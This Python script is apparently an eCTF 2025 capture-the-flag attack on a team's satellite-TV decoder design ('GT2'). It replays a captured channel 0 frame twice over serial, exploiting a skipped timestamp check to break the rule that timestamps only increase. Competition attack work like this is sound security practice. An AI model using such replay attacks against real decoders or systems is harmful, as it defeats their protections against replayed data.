"""Pesky Neighbor attack for GT2
@author: Qize Zhang
@description: GT2 bypasses the timestamp check for channel 0, so by simply replaying GT2 channel 0 frame,
we can make it violate security requirement 3 (monotonically increasing timestamps)
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def gt2_channel_0() -> bytes:
    """Qize Zhang
        simply replay GT2 channel 0 frame
    """
    # GT2 channel 0 frame data (replace with actual captured frame)
    gt2_frame_channel0 = b'\x00\x00\x00\x00\xce\xc5Le\xf1O\x06\x00noflagonthischan^ flag ^00064ff1654cc5ce^ time ^f6379e818a31bc49\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    return gt2_frame_channel0

if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay GT2 channel 0 frame
    interface.decode(gt2_channel_0())
    interface.decode(gt2_channel_0())

    print("Done with pesky Neighbor attack")